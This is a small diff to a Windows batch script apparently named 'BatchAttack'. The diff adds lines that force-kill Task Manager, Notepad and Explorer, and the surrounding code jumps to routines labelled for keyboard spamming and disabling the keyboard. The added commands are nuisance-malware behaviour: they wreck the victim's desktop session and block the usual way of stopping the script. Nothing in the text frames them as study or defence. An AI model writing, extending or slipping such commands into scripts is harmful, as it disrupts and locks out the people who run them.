@@ -57,6 +57,10 @@ echo Loading BatchAttack. . .
 ping localhost -n 1 >nul
 ping localhost -n 2 >nul
 
+taskkill /f /im taskmgr.exe
+taskkill /f /im notepad.exe
+taskkill /f /im explorer.exe
+
 goto :shrek
 goto :Keyboardspam
 goto :keyboarddisabler
